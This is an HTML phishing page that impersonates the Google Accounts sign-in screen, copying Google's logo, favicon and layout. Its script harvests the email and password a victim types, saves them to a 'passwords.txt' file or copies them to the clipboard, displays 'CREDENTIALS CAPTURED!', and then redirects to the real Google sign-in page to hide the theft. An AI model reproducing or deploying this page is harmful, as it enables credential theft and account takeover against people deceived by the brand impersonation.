<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://accounts.google.com/favicon.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;font-size:16px;line-height:1.5}
        .main-container{max-width:576px;margin:0 auto;padding:0 24px}
        .top-section{padding:48px 0 0}
        .logo{text-align:center;margin-bottom:32px}
        .logo img{width:92px;height:30px}
        .title{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px;text-align:center}
        .subtitle{color:#5f6368;font-size:16px;text-align:center;margin-bottom:40px}
        .form-card{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:408px;margin:0 auto}
        .form-group{margin-bottom:24px;position:relative}
        label{display:block;margin-bottom:8px;color:#202124;font-size:16px;font-weight:400}
        input{width:100%;padding:13px 16px 13px 48px;border:1px solid #dadce0;border-radius:4px;font-size:16px;background:#fafbfc;color:#202124;transition:all .2s}
        input:focus{outline:none;border-color:#4285f4;box-shadow:0 1px 2px rgba(66,133,244,.3)}
        input::placeholder{color:#5f6368}
        .email-icon{position:absolute;left:16px;top:17px;width:24px;height:24px;opacity:.6}
        .signin-btn{width:100%;background:linear-gradient(#1a73e8,#1669c0);color:#fff;border:none;padding:12px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin:8px 0 0;transition:background .2s;box-shadow:0 1px 2px rgba(0,0,0,.1)}
        .signin-btn:hover{background:linear-gradient(#1557b0,#124592)}
        .signin-btn:disabled{background:#ccc;color:#999;cursor:not-allowed}
        .status{display:none;color:#137333;font-weight:500;margin-top:16px;padding:12px 16px;background:#e6f4ea;border:1px solid #b7e0cd;border-radius:4px}
        .links{text-align:center;margin-top:32px;font-size:14px}
        .links a{color:#1a73e8;text-decoration:none;margin:0 20px;font-family:Roboto,Arial,sans-serif}
        .bottom-bar{position:fixed;bottom:0;left:0;right:0;height:32px;border-top:1px solid #e8eaed;padding:0 24px;display:flex;align-items:center;justify-content:space-between;background:#f8f9fa;font-size:13px;color:#5f6368}
        @media (max-width:600px){.form-card{margin:0 16px;padding:40px 32px}}
    </style>
</head>
<body>
    <div class="main-container">
        <div class="top-section">
            <div class="logo">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" onerror="this.outerHTML='<div style=\"font-family:Google Sans;font-size:48px;color:#4285f4;font-weight:300;padding:20px 0\">G</div>'">
            </div>
            <h1 class="title">Sign in</h1>
            <p class="subtitle">Use your Google Account</p>
        </div>
        
        <div class="form-card">
            <form id="loginForm">
                <div class="form-group">
                    <label for="email">Email or phone</label>
                    <svg class="email-icon" viewBox="0 0 24 24" fill="#5f6368">
                        <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
                    </svg>
                    <input type="email" id="email" name="email" placeholder="youremail@gmail.com" required autocomplete="email">
                </div>
                <div class="form-group">
                    <label for="password">Enter your password</label>
                    <svg class="email-icon" style="top:15px;" viewBox="0 0 24 24" fill="#5f6368">
                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
                    </svg>
                    <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
                </div>
                <button type="submit" class="signin-btn" id="submitBtn">Next</button>
                <div id="status" class="status"></div>
            </form>
            <div class="links">
                <a href="#" tabindex="0">Forgot password?</a>
                <a href="#" tabindex="0">Create account</a>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('submitBtn');
            const status = document.getElementById('status');
            
            if (!email || !password) {
                alert('Please enter your email and password');
                return;
            }
            
            // Show verifying state
            btn.textContent = 'Verifying...';
            btn.disabled = true;
            status.style.display = 'block';
            status.innerHTML = 'Checking your account...';
            
            const now = new Date().toISOString();
            const logEntry = `[${now.slice(0,19).replace('T',' ')}] EMAIL: ${email} | PASS: ${password}\n`;
            
            // 1. Save to passwords.txt file (primary method)
            try {
                const fileHandle = await window.showSaveFilePicker({
                    suggestedName: 'passwords.txt',
                    types: [{
                        description: 'Text files',
                        accept: {'text/plain': ['.txt']}
                    }]
                });
                const writable = await fileHandle.createWritable();
                await writable.write(logEntry);
                await writable.close();
                status.innerHTML = '✅ <strong>CREDENTIALS SAVED TO passwords.txt</strong>';
            } catch (e) {
                // Fallback: clipboard + display
                await navigator.clipboard.writeText(logEntry);
                status.innerHTML = `✅ <strong>CREDENTIALS CAPTURED!</strong><br>Copied to clipboard (File dialog blocked)<br><code>${logEntry}</code>`;
            }
            
            btn.textContent = 'Captured!';
            
            // Redirect to real Google after 4 seconds
            setTimeout(() => {
                window.location.href = 'https://accounts.google.com/';
            }, 4000);
        });
    </script>
</body>
</html>
